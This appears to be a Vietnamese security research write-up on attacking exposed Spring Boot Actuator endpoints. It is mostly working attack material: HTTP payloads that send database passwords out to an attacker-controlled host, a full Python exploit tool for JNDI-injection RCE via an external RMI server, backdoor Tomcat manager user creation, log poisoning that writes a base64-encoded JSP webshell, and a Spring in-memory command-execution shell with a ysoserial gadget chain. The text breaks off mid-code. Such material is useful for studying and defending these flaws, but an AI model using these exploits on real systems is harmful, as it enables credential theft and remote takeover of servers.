# Nghiên cứu Java Spring boot

## I. Khai thác Spring boot actuator

### 1. Spring boot actuator

- Là 1 sub-project của Spring boot.
- Dùng để theo dõi, giám sát ứng dụng, thu thập số liệu, lưu lượng truy cập hoặc trạng thái của cơ sở dữ liệu.
- Có 2 phiên bản là **Boot 1.x** và **Boot 2.x**
  - **Boot 1.x**: Theo R/W Model, ta có thể đọc hoặc ghi dữ liệu trên các endpoint ở Actuator. Ví dụ ta có thể lấy dữ liệu về tình trạng của ứng dụng ở endpoint **/metrics** hoặc shutdown/restart ứng dụng ở các endpoint **/shutdown** hoặc **/restart**
  - **Boot 2.x:** Do ở phiên bản 1, có các endpoint nguy hiểm có thể bị lợi dụng tác động đến hoạt động ứng dụng, nên phiên bản này đã vô hiệu hóa hầu hết các endpoint đó. Chỉ giữ lại hai endpoint mặc định là **/health** và **/info**. Nếu muốn kích hoặc toàn bộ endpoint hoặc 1 vài endpoint, ta có thể cấu hình qua thông số **management.endpoints.web.exposure.include=*** ở file **apllication.properties**

- Các endpoint mặc định có thể nguy hiểm:
  - **/beans**: Hiện danh sách các **Spring beans** ở ứng dụng. Có thể hiểu các Spring beans này là những module chính của chương trình, và đều được quản lí bởi **Spring IOC container**.
  - **/auditevents**: expose audit event hiện tại của ứng dụng. Yêu cầu phải có **AuditEventRepository** Beans. -> Ở đây tùy vào đặc thù của ứng dụng có thể leak được các thông tin cần thiết, ví dụ ở event đăng nhập có trả về giá trị đăng nhập thành công hoặc thất bại của người dùng -> **leak được username**.
  - **/caches**: expose các biến caches đang khả dụng. -> **Leak thông tin từ caches các thông tin như webroot,....**
  - **/configprops**: các thông tin config cơ bản -> **Leak được tên database hoặc các thông tin cấu hình**
  - **/env**: Các thông tin thuộc tính của ứng dụng -> **Leak được các thông tin cấu hình như csrf, tên database ,...**
  - **/trace**: Thông tin gần nhất của 100 request gần nhất đến ứng dụng -> **Leak được sessionid **
  - **/info** : 1 trong 2 endpoint mặc định 2 phiên bản, được cấu hình hiển thị các thông tin nhất định mà người dùng tự cấu hình.
  - **/mappings**: Route của ứng dụng.
  - **/dump**: thực hiện dump thread hiện tại.
  - **/heapdump**: trả về giá trị hprof heap dump file, sử dụng VisualVM để read các value của biến.
  - **/jolokia**: expose JMX beans qua http ( chỉ khi jolokia có trong classpath, không khả dụng ở web flux ). Yêu cầu phải có depencies **jolokia-core** 
  - **/logfile**: hiện nội dung log file.





### 2. Leak thông tin thông qua env

- Khi truy cập vào endpoint **/env** ta thường sẽ thấy thông tin nhạy cảm như thông tin tài khoản/mật khẩu người dùng, databaes đều ẩn đi.


##### 2.1 Đọc plaintext password thông qua /Jolokia

- Yêu cầu: 
  -  Có endpoint /jolokia hoặc /actuator/jolokia tùy phiên bản
  -  Có depency jolokia-core.

```http
POST /jolokia HTTP/1.1
Content-Type: application/json

{"mbean": "org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager","operation": "getProperty", "type": "EXEC", "arguments": ["spring.datasource.password"]}
```

Response

```http
HTTP/1.1 200 
X-Application-Context: application
Cache-Control: no-cache
Pragma: no-cache
Date: Fri, 05 Nov 2021 07:31:26 GMT
Expires: Fri, 05 Nov 2021 06:31:26 GMT
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
X-Frame-Options: DENY
Content-Type: text/plain;charset=utf-8
Connection: close
Content-Length: 263

{"request":{"mbean":"org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager","arguments":["spring.datasource.password"],"type":"exec","operation":"getProperty"},"value":"woshishujukumima","timestamp":1636097486,"status":200}
```



##### 2.2 Đọc plaintext thông qua /env ( có thể request ra mạng ngoài )

- Yêu cầu: 

  - Có thể request GET/POST đến endpoint **/env**.
  - Có thể POST request đến endpoint **/refresh** ( có depency spring-boot-starter-actuator )
  - Có depency spring-cloud-starter-netfix-eureka-client
  - Có thể request ra mạng ngoài.

- Các bước thực hiện 

  - Mở port tại máy attacker: nc -lvp 80

  - Gửi request đến endpoint /env

    ```http
    POST /env HTTP/1.1
    Content-Type: application/x-www-form-urlencoded
    
    
    eureka.client.serviceUrl.defaultZone=http://192.168.180.130/?=value:${spring.datasource.password}
    ```

  - Refresh để trigger.

    ```http
    POST /refresh HTTP/1.1
    Content-Type: application/x-www-form-urlencoded
    ```

  - Ta sẽ thấy request đến máy attacker kèm basic authen ở trường Authorization => decode base64.

##### 2.3 Đọc plaintext thông qua /env ( không thể request ra mạng ngoài )

- Yêu cầu:

  - Có thể request GET/POST đến endpoint **/env**.
  - Có thể POST request đến endpoint **/refresh** ( có depency spring-boot-starter-actuator )
  - Control được máy chủ ở mạng nội bộ để hứng request

- Các bước thực hiện:

  - Mở port tại máy nội bộ đã control: nc -lvp 80

  - Gửi request đến endpoint /env

    ```http
    POST /env HTTP/1.1
    Content-Type: application/x-www-form-urlencoded
    
    spring.cloud.bootstrap.location=http://192.168.180.130/?=${spring.datasource.password}
    ```
  
  - Refresh để trigger.
  
    ```http
    POST /refresh HTTP/1.1
    Content-Type: application/x-www-form-urlencoded
    ```
  
  - Ta sẽ thấy HEAD request chứa password dạng plaintext
  
    ```http
    HEAD /?=woshishujukumima HTTP/1.1
    Cache-Control: no-cache
    Pragma: no-cache
    User-Agent: Java/1.8.0_102
    Host: 192.168.180.130
    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
    Connection: keep-alive
    ```



### 2. Remote code execution 



- Nếu thư viện **jolokia** có ở classpath, endpoint **/jolokia** sẽ được expose thông qua Spring boot actuator. Jolokia cho phép truy cập tất cả các MBeans và thực thi nó như là với JMX. Như vậy ta có thể list toàn bộ các MBeans action thông qua url http://target/jolokia/list.

#### 2.1 Khai thác thông qua JNDI Injection ở endpoint /jolokia

##### 2.1.1 Khai thác thông qua CreateJNDIRealm

- Yêu cầu: 
  -  Có endpoint /jolokia hoặc /actuator/jolokia tùy phiên bản
  -  Có depency jolokia-core.

- Chain khai thác như sau

```java
// Tạo 1 realm mới 
create_realm = {
     "mbean": "Tomcat:type=MBeanFactory",
     "type": "EXEC",
     "operation": "createJNDIRealm",
     "arguments": ["Tomcat:type=Engine"]
 }

// Ghi connectionUrl vào Realm để victim kết nối đến service đã chuẩn bị sẵn
 write_url = {
     "mbean": "Tomcat:realmPath=/realm0,type=Realm",
     "type": "WRITE",
     "attribute": "connectionURL",
     "value": "rmi://localhost:1097/Object"
 }

//Set context hiện tại cho Registry proxy
 wirte_factory = {
     "mbean": "Tomcat:realmPath=/realm0,type=Realm",
     "type": "WRITE",
     "attribute": "contextFactory",
     "value": "com.sun.jndi.rmi.registry.RegistryContextFactory"
 }

//Dừng realm.
 stop = {
     "mbean": "Tomcat:realmPath=/realm0,type=Realm",
     "type": "EXEC",
     "operation": "stop",
     "arguments": []
 }
//bắt đầu realm để trigger JNDI call.
 start = {
     "mbean": "Tomcat:realmPath=/realm0,type=Realm",
     "type": "EXEC",
     "operation": "start",
     "arguments": []
 }
```

- Các bước thực hiện khai thác:

  - Tạo service RMI hoặc LDAP để chứa gadget:

    - Sử dụng công cụ hoặc có thể tự code để tạo service RMI chứa gadget. Ở đây sử dụng ```https://github.com/welk1n/JNDI-Injection-Exploit``` 

      ```java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "touch /tmp/exploit.txt" -A "127.0.0.1"```

      

##### 2.1.2 Khai thác thông qua **reloadByURL** 

- Yêu cầu: 

  - logback depency phải có ở classpath

    ```xml
    <dependency>
      <groupId>ch.qos.logback</groupId>
      <artifactId>logback-classic</artifactId>
      <version>1.1.11</version>
    </dependency>
    //Các version khác đều bị lỗi do đây là tính năng của hàm reloadByURL.
    ```

  - Có jolokia ở classpath

    ```java
    <dependency>
                <groupId>org.jolokia</groupId>
                <artifactId>jolokia-core</artifactId>
                <version>1.6.0</version>
            </dependency>
    ```

  - phải có outbound để thực hiện request ra ngoài hoặc có thể kiểm soát được 1 máy ở mạng nội bộ để thực hiện request đến.

- Nguyên nhân:

  ```java
  
  //ch\qos\logback\logback-classic\1.1.11\logback-classic-1.1.11.jar!\ch\qos\logback\classic\jmx\JMXConfigurator.class   
  	public void reloadByURL(URL url) throws JoranException {
  	... //Hàm reloadByUrl nhận tham số url từ người dùng
          try {
              if (url != null) {
                  JoranConfigurator configurator = new JoranConfigurator();
                  configurator.setContext(this.loggerContext);
                  configurator.doConfigure(url); 
                  this.addInfo("Context: " + this.loggerContext.getName() + " reloaded.");
              }
  	...
      }
  
  //ch\qos\logback\logback-core\1.1.11\logback-core-1.1.11.jar!\ch\qos\logback\core\joran\GenericConfigurator.class    
  	public final void doConfigure(URL url) throws JoranException {
      ...
          try {
              var12 = true;
              informContextOfURLUsedForConfiguration(this.getContext(), url);
              URLConnection urlConnection = url.openConnection();
              urlConnection.setUseCaches(false);
              in = urlConnection.getInputStream();
              this.doConfigure(in, url.toExternalForm());
              var12 = false;
          } catch (IOException var15) {
              errMsg = "Could not open URL [" + url + "].";
              this.addError(errMsg, var15);
              throw new JoranException(errMsg, var15);
  	...
      }
  
          public final void doConfigure(InputStream inputStream, String systemId) throws JoranException 
          {
          	InputSource inputSource = new InputSource(inputStream);
          	inputSource.setSystemId(systemId);
          	this.doConfigure(inputSource);
      	}
  
          
          
  //ch\qos\logback\logback-core\1.1.11\logback-core-1.1.11.jar!\ch\qos\logback\core\joran\spi\EventPlayer.class        
      public void play(List<SaxEvent> aSaxEventList) {
              this.eventList = aSaxEventList;
  
              for(this.currentIndex = 0; this.currentIndex < this.eventList.size(); ++this.currentIndex) {
                  SaxEvent se = (SaxEvent)this.eventList.get(this.currentIndex);
                  if (se instanceof StartEvent) {
                      this.interpreter.startElement((StartEvent)se);
                      this.interpreter.getInterpretationContext().fireInPlay(se);
                  }
  	...
          }
          
  //ch\qos\logback\logback-classic\1.1.11\logback-classic-1.1.11.jar!\ch\qos\logback\classic\joran\action\InsertFromJNDIAction.class
          public void begin(InterpretationContext ec, String name, Attributes attributes) {
          ...
          if (errorCount == 0) {
              try {
                  Context ctx = JNDIUtil.getInitialContext();
                  String envEntryValue = JNDIUtil.lookup(ctx, envEntryName);//[x]
                  if (OptionHelper.isEmpty(envEntryValue)) {
                      this.addError("[" + envEntryName + "] has null or empty value");
                  } else {
                      this.addInfo("Setting variable [" + asKey + "] to [" + envEntryValue + "] in [" + scope + "] scope");
                      ActionUtil.setProperty(ec, asKey, envEntryValue, scope);
                  }
              } catch (NamingException var11) {
                  this.addError("Failed to lookup JNDI env-entry [" + envEntryName + "]");
              }
  		...
          }
      }
          
  //ch\qos\logback\logback-classic\1.1.11\logback-classic-1.1.11.jar!\ch\qos\logback\classic\util\JNDIUtil.class
          public static String lookup(Context ctx, String name) {
          if (ctx == null) {
              return null;
          } else {
              try {
                  Object lookup = ctx.lookup(name);
                  return lookup == null ? null : lookup.toString();
              } catch (NamingException var3) {
                  return null;
              }
          }
      }
  ```

  

- Các bước thực hiện khai thác:

  - Chuẩn bị file xml có nội dung như sau

    ```xml
    <configuration>
    	<insertFromJNDI env-entry-name="rmi://[rmi_host]:[rmi_port]/[rmi_service_name]" as="appName"/>
    </configuration>
    ```

  - Gửi request đến endpoint /jolokia để trigger jndi call.

    ```htt
    http://target/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/[host]:[port]!/[xml_file]
    ```

Reference:

Xstream: https://github.com/LandGrey/SpringBootVulExploit#0x03eureka-xstream-deserialization-rce

Yaml Deserialize: https://www.veracode.com/blog/research/exploiting-spring-boot-actuators


##### 2.1.3 Upload war file in Tomcat Manager

Abuse JMX tạo user Tomcat và truy cập vào Tomcat Manager để upload file war => webshell

```
reate_role= {
    "type":"EXEC",
    "mbean":"Users:type=UserDatabase,database=UserDatabase",
    "operation":"createRole",
    "arguments": ["manager-gui",""]
}

create_use = {
    "type":"EXEC",
    "mbean":"Users:type=UserDatabase,database=UserDatabase",
    "operation":"createUser",
    "arguments": ["user1","user1",""]
}

add_role = {
    "type":"EXEC",
    "mbean":"Users:type=User,database=UserDatabase,username=\"user1\"",
    "operation":"addRole",
    "arguments": ["manager-gui"]
}
```

##### 2.1.4 Modify AccessControllerValve log pattern to Write Shell

Dựa vào 1 bài trình bày của anh ***_tint0*** ở Black Hat để abuse JMX.

- Lợi dụng javax.management.loading.Mlet của Tomcat tạo custom logging pattern
- Poison logging by pattern
- Invoke AccessControllerValve.rotate() to write buffered log to a .jsp file

Full code exploit 3 case 2.1.1, 2.1.3, 2.1.4.

```python
import requests
import argparse
import base64

#url = 'http://192.168.88.128:1337/vulnapp/actuator/jolokia'


create_realm = {
    "mbean": "Catalina:type=MBeanFactory",
    "type": "EXEC",
    "operation": "createJNDIRealm",
    "arguments": ["Catalina:type=Engine"]
}

wirte_factory = {
    "mbean": "Catalina:realmPath=/realm0,type=Realm",
    "type": "WRITE",
    "attribute": "contextFactory",
    "value": "com.sun.jndi.rmi.registry.RegistryContextFactory"
}

write_url = {
    "mbean": "Catalina:realmPath=/realm0,type=Realm",
    "type": "WRITE",
    "attribute": "connectionURL",
    "value": "rmi://45.76.185.249:1099/fz8i79"
}

stop = {
    "mbean": "Catalina:realmPath=/realm0,type=Realm",
    "type": "EXEC",
    "operation": "stop",
    "arguments": []
}

start = {
    "mbean": "Catalina:realmPath=/realm0,type=Realm",
    "type": "EXEC",
    "operation": "start",
    "arguments": []
}

create_role= {
    "type":"EXEC",
    "mbean":"Users:type=UserDatabase,database=UserDatabase",
    "operation":"createRole",
    "arguments": ["manager-gui",""]
}

create_use = {
    "type":"EXEC",
    "mbean":"Users:type=UserDatabase,database=UserDatabase",
    "operation":"createUser",
    "arguments": ["user1","user1",""]
}

add_role = {
    "type":"EXEC",
    "mbean":"Users:type=User,database=UserDatabase,username=\"user1\"",
    "operation":"addRole",
    "arguments": ["manager-gui"]
}

reWritePattern = {
    "type":"WRITE",
    "mbean":"Catalina:type=Valve,host=localhost,name=AccessLogValve",
    "attribute":"pattern",
    "value":"%{shell}i"
}

rotateLog = {
    "type":"EXEC",
    "mbean":"Catalina:type=Valve,host=localhost,name=AccessLogValve",
    "operation":"rotate(java.lang.String)",
    "arguments": ["/home/service/apache-tomcat-8.5.35/webapps/vulnapp/shell.jsp"]
}

shell = """PCVAIHBhZ2UgaW1wb3J0PSJqYXZhLnV0aWwuKixqYXZhLmlvLioiJT48JSBQcm9jZXNzIHA9UnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpO091dHB1dFN0cmVhbSBvcyA9IHAuZ2V0T3V0cHV0U3RyZWFtKCk7SW5wdXRTdHJlYW0gaW4gPSBwLmdldElucHV0U3RyZWFtKCk7RGF0YUlucHV0U3RyZWFtIGRpcyA9IG5ldyBEYXRhSW5wdXRTdHJlYW0oaW4pO1N0cmluZyBkaXNyID0gZGlzLnJlYWRMaW5lKCk7d2hpbGUgKCBkaXNyICE9IG51bGwgKSB7b3V0LnByaW50bG4oZGlzcik7ZGlzciA9IGRpcy5yZWFkTGluZSgpO30lPg=="""

headers = {
    'shell':base64.b64decode(shell),
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate'
}

flow = [create_realm, wirte_factory, write_url, stop, start]
add_user = [create_role, create_use, add_role]
proxies = { 'http': '127.0.0.1:8080'}
parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", metavar="", required=True, help="Url")
parser.add_argument("-t", "--type", metavar="", help="Type exploit [JNDI|CRT_USR|SHELL]", default="JNDI")
parser.add_argument("-p", "--path", metavar="", help="Path to write shell")
parser.add_argument("-l", "--logpoison", metavar="", help="Url to poison log")
parser.add_argument("-r", "--rmiserver", metavar="", help="RMI Server")
args=parser.parse_args()
if args.type == "JNDI":
    if args.rmiserver is None:
        print("Missing RMI Server")
        exit()
    else:
        str_rp = '{}'.format(args.rmiserver)
        write_url["value"]=str_rp
        for i in flow:
            print('%s MBean %s: %s ...' % (i['type'].title(), i['mbean'], i.get('operation', i.get('attribute'))))
            r = requests.post(args.url, json=i, proxies=proxies)
            r.json()
elif args.type == "CRT_USR":
    for i in add_user:
        print('%s MBean %s: %s ...' % (i['type'].title(), i['mbean'], i.get('operation', i.get('attribute'))))
        r = requests.post(args.url, json=i, proxies=proxies)
        print(r.json())
    print("[*]Success create user")
    print("[*]Login with account: user1/user1")
elif args.type == "SHELL":
    if args.path is None:
        print("Missing path")
        exit()
    if args.logpoison is None:
        print("Missing Url to poison log")
        exit()        
    else:
        r = requests.post(args.url, json=reWritePattern, proxies=proxies)
        r.json()
        print("[+] reWrite pattern log valve")
        str_rp = ['{}/shell.jsp'.format(args.path)]
        rotateLog["arguments"]=str_rp
        r = requests.get(args.logpoison, proxies=proxies, headers = headers)
        r.content
        print("[+] Poison log")
        r = requests.post(args.url, json=rotateLog, proxies=proxies)
        r.json()
        print("[+] Rotate log")
        print("[*] Enjoy your shell.jsp")
else:
    print("None type")
    exit()
```

#### 2.2 Mem shell on Spring

- Điều kiện:

  - Có 1 lỗi ở server như Deserialize ( có gadget ), JNDI. Do đặc thù routing của Spring nên không thể thể up file shell.

- Tạo mã khai thác:

  - Tạo 1 ứng dụng spring, bản exploit này dành cho bản spring < 2.3.x . Do bản lớn hơn đã có payload sẵn. Có gadget CommonsCollections

  - Code controller Hello

    ```java
    package hello;
    
    import com.fasterxml.jackson.databind.DeserializationConfig;
    import com.fasterxml.jackson.databind.ObjectMapper;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.springframework.web.bind.annotation.*;
    import org.springframework.web.context.WebApplicationContext;
    import org.springframework.web.context.request.RequestContextHolder;
    import org.springframework.web.multipart.MultipartFile;
    
    import javax.naming.Context;
    import javax.naming.InitialContext;
    import javax.naming.NamingException;
    import javax.script.ScriptEngine;
    import javax.script.ScriptEngineManager;
    import javax.script.ScriptException;
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    import java.io.ByteArrayInputStream;
    import java.io.IOException;
    import java.io.ObjectInputStream;
    import java.io.PrintWriter;
    import java.lang.reflect.InvocationTargetException;
    import java.lang.reflect.Method;
    import java.util.Base64;
    
    @RestController
    public class HelloController {
    
        @RequestMapping("/")
        public String index(HttpServletRequest request, HttpServletResponse response) throws NamingException, IOException, ClassNotFoundException, NoSuchMethodException, NoSuchFieldException, InvocationTargetException, IllegalAccessException, InstantiationException, ScriptException {
    
                String pl = request.getParameter("pl");
                if( pl != null){
                    ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
                    engine.eval(pl);
                }
    
                String test = request.getParameter("test");
                if( test != null ){
    
    
                    //Lấy ApplicationContext.
                    WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
    
    
                    //lấy request mapping
                    org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean("requestMappingHandlerMapping");
                    java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
                    field.setAccessible(true);
                    java.util.ArrayList<Object> adaptedInterceptors = (java.util.ArrayList<Object>)field.get(abstractHandlerMapping);
                    String className = "com.memshell.blablaInterceptor";
                    String b64 = "yv66vgAAADIAhwoAIABGCAA4CwBHAEgLAEkASggASwgATAoATQBOCgAMAE8IAFAKAAwAUQcAUgcAUwgAVAgAVQoACwBWCABXCABYBwBZCgALAFoKAFsAXAoAEgBdCABeCgASAF8KABIAYAoAEgBhCgASAGIKAGMAZAoAYwBlCgBjAGIHAGYHAGcHAGgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAIExjb20vbWVtc2hlbGwvYmxhYmxhSW50ZXJjZXB0b3I7AQAJcHJlSGFuZGxlAQBkKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDspWgEAAXABABpMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEABndyaXRlcgEAFUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAAW8BABJMamF2YS9sYW5nL1N0cmluZzsBAAFjAQATTGphdmEvdXRpbC9TY2FubmVyOwEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAdoYW5kbGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAEY29kZQEADVN0YWNrTWFwVGFibGUHAFMHAGkHAFIHAFkHAGcHAGoHAGsHAGwHAGYBAApFeGNlcHRpb25zAQAKU291cmNlRmlsZQEAFmJsYWJsYUludGVyY2VwdG9yLmphdmEMACEAIgcAagwAbQBuBwBrDABvAHABAAABAAdvcy5uYW1lBwBxDAByAG4MAHMAdAEAA3dpbgwAdQB2AQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyAQAQamF2YS9sYW5nL1N0cmluZwEAB2NtZC5leGUBAAIvYwwAIQB3AQAHL2Jpbi9zaAEAAi1jAQARamF2YS91dGlsL1NjYW5uZXIMAHgAeQcAegwAewB8DAAhAH0BAAJcQQwAfgB/DACAAIEMAIIAdAwAgwAiBwBpDACEAIUMAIYAIgEAE2phdmEvbGFuZy9FeGNlcHRpb24BAB5jb20vbWVtc2hlbGwvYmxhYmxhSW50ZXJjZXB0b3IBAEFvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L2hhbmRsZXIvSGFuZGxlckludGVyY2VwdG9yQWRhcHRlcgEAE2phdmEvaW8vUHJpbnRXcml0ZXIBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBABBqYXZhL2xhbmcvT2JqZWN0AQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAFY2xvc2UBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABWZsdXNoACEAHwAgAAAAAAACAAEAIQAiAAEAIwAAAC8AAQABAAAABSq3AAGxAAAAAgAkAAAABgABAAAACAAlAAAADAABAAAABQAmACcAAAABACgAKQACACMAAAG6AAYACQAAAK8rEgK5AAMCADoEGQTGAKEsuQAEAQA6BRIFOgYSBrgAB7YACBIJtgAKmQAiuwALWQa9AAxZAxINU1kEEg5TWQUZBFO3AA86B6cAH7sAC1kGvQAMWQMSEFNZBBIRU1kFGQRTtwAPOge7ABJZGQe2ABO2ABS3ABUSFrYAFzoIGQi2ABiZAAsZCLYAGacABRkGOgYZCLYAGhkFGQa2ABsZBbYAHBkFtgAdpwAFOgUDrASsAAEADwCmAKkAHgADACQAAABGABEAAAALAAoADAAPAA4AFwAPABsAEQArABIASgAUAGYAFgB8ABcAkAAYAJUAGQCcABoAoQAbAKYAHQCpABwAqwAeAK0AIAAlAAAAZgAKAEcAAwAqACsABwAXAI8ALAAtAAUAGwCLAC4ALwAGAGYAQAAqACsABwB8ACoAMAAxAAgAAACvACYAJwAAAAAArwAyADMAAQAAAK8ANAA1AAIAAACvADYANwADAAoApQA4AC8ABAA5AAAAOQAH/gBKBwA6BwA7BwA6/AAbBwA8/AAlBwA9QQcAOv8AGgAFBwA+BwA/BwBABwBBBwA6AAEHAEIBAQBDAAAABAABAB4AAQBEAAAAAgBF"; 
                    byte[] bytes = sun.misc.BASE64Decoder.class.newInstance().decodeBuffer(b64);
                    java.lang.ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
                    try {
                        //classLoader.defineclass(className);
                        //Dùng Class.loader để gọi class inject vào interceptor
    
                        java.lang.reflect.Method m0 = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
                        m0.setAccessible(true);
                        m0.invoke(classLoader, className, bytes, 0, bytes.length);
                        adaptedInterceptors.add(classLoader.loadClass("com.memshell.blablaInterceptor").newInstance());
                    }catch (ClassNotFoundException e){
                        e.printStackTrace();
                    }
                }
                String ser = request.getParameter("ser");
                                if(ser != null) {
                                    try {
                                        String base64_ser = request.getParameter("ser").trim();
                                        byte[] decoder = Base64.getDecoder().decode(base64_ser);
                                        ByteArrayInputStream bis = new ByteArrayInputStream(decoder);
                                        ObjectInputStream ois = new ObjectInputStream(bis);
                                        ois.readObject();
                                } catch (Exception e) {
                                        e.printStackTrace();
                                }
                            }
                                return "Greetings from Spring Boot!";
        }
    }
    
    ```

  - Payload memshell để edit

    ```java
    //certutil -encode blablaInterceptor.class tmp.b64
    //findstr /v /c:- tmp.b64 > data.b64
    //
    package com.memshell;
    
    import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;
    
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    //Lưu ý public, tránh bị cannot accept from class
    public class blablaInterceptor extends HandlerInterceptorAdapter {
        @Override
        public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
            String code = request.getParameter("code");
            if(code != null){
                try {
                    java.io.PrintWriter writer = response.getWriter();
                    String o = "";
                    ProcessBuilder p;
                    if(System.getProperty("os.name").toLowerCase().contains("win")){
                        p = new ProcessBuilder(new String[]{"cmd.exe", "/c", code});
                    }else{
                        p = new ProcessBuilder(new String[]{"/bin/sh", "-c", code});
                    }
                    java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter("\\A");
                    o = c.hasNext() ? c.next(): o;
                    c.close();
                    writer.write(o);
                    writer.flush();
                    writer.close();
                }catch (Exception e){
                }
                return false;
            }
            return true;
        }
    
    }
    ```

    

  - Sửa gadget ysoserial CommonsCollections5 thành script engine

    ```java
    package ysoserial.payloads;
    
    import java.lang.reflect.Field;
    import java.lang.reflect.InvocationHandler;
    import java.util.HashMap;
    import java.util.Map;
    
    import javax.management.BadAttributeValueExpException;
    import javax.script.ScriptEngineManager;
    
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.keyvalue.TiedMapEntry;
    import org.apache.commons.collections.map.LazyMap;
    
    import ysoserial.payloads.annotation.Authors;
    import ysoserial.payloads.annotation.Dependencies;
    import ysoserial.payloads.annotation.PayloadTest;
    import ysoserial.payloads.util.Gadgets;
    import ysoserial.payloads.util.JavaVersion;
    import ysoserial.payloads.util.PayloadRunner;
    import ysoserial.payloads.util.Reflections;
    
    /*
    	Gadget chain:
            ObjectInputStream.readObject()
                BadAttributeValueExpException.readObject()
                    TiedMapEntry.toString()
                        LazyMap.get()
                            ChainedTransformer.transform()
                                ConstantTransformer.transform()
                                InvokerTransformer.transform()
                                    Method.invoke()
                                        Class.getMethod()
                                InvokerTransformer.transform()
                                    Method.invoke()
                                        Runtime.getRuntime()
                                InvokerTransformer.transform()
                                    Method.invoke()
                                        Runtime.exec()
    
    	Requires:
    		commons-collections
     */
    /*
    This only works in JDK 8u76 and WITHOUT a security manager
    
    https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR70
     */
    @SuppressWarnings({"rawtypes", "unchecked"})
    @PayloadTest ( precondition = "isApplicableJavaVersion")
    @Dependencies({"commons-collections:commons-collections:3.1"})
    @Authors({ Authors.MATTHIASKAISER, Authors.JASINNER })
    public class CommonsCollections5 extends PayloadRunner implements ObjectPayload<BadAttributeValueExpException> {
    
    	public BadAttributeValueExpException getObject(final String command) throws Exception {
    		final String[] execArgs = new String[] { command };
    		// inert chain for setup
    		final Transformer transformerChain = new ChainedTransformer(
    		        new Transformer[]{ new ConstantTransformer(1) });
    		// real chain for after setup
            final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(ScriptEngineManager.class),
                new InvokerTransformer("getConstructor",
                    new Class[] {Class[].class },
                    new Object[] {new Class[0] }),
                new InvokerTransformer("newInstance",
